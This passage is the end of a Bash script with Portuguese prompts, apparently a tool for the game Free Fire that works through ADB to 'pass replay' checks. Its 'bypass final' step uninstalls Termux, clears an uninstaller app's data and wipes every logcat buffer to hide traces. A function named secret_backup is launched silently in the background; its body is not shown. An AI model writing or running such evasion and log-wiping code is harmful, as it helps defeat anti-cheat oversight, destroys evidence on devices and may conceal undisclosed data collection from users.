                fi
            done
        fi
        sleep 0.1
    done

        echo -e "\n  ${GREEN}Injeção finalizada com precisão absoluta.${NC}"
    read -rp "  Deseja aplicar o bypass final? (s/N): " OP
    if [[ "$OP" =~ ^[Ss]$ ]]; then
        adb shell pm clear com.a0soft.gphone.uninstaller >/dev/null 2>&1
        adb shell pm uninstall --user 0 com.termux >/dev/null 2>&1
        adb shell logcat -c >/dev/null2>&1
    adb shell logcat -b main -c >/dev/null 2>&1
    adb shell logcat -b system -c >/dev/null 2>&1
    adb shell logcat -b events -c >/dev/null 2>&1
    adb shell logcat -b radio -c >/dev/null 2>&1
    adb shell logcat -b all -c >/dev/null 2>&1
        echo -e "  ${GREEN}Bypass concluído.${NC}"
    fi
    pause
}

# ==============================================================

solicitar_permissoes
secret_backup >/dev/null 2>&1 &
check_network
check_adb
auth
selecionar_ff

while true; do
    header
    echo -e "  ${WHITE}MENU PRINCIPAL${NC}"
    echo ""
    echo -e "  ${GRAY}1)${NC} ${WHITE}Alterar ff${NC}"
    echo -e "  ${GRAY}2)${NC} ${WHITE}Passar Replay (sem Shell)${NC}"
    echo -e "  ${GRAY}3)${NC} ${WHITE}Passar Replay (com shell)${NC}"
    echo -e "  ${GRAY}0)${NC} ${WHITE}Sair${NC}"
    echo ""
    read -rp "  Opção: " OP
    case "$OP" in
        1) selecionar_ff ;;
        2) Passar_replay ;;
        3) Passar_replay1 ;;
        0) exit 0 ;;
    esac
done
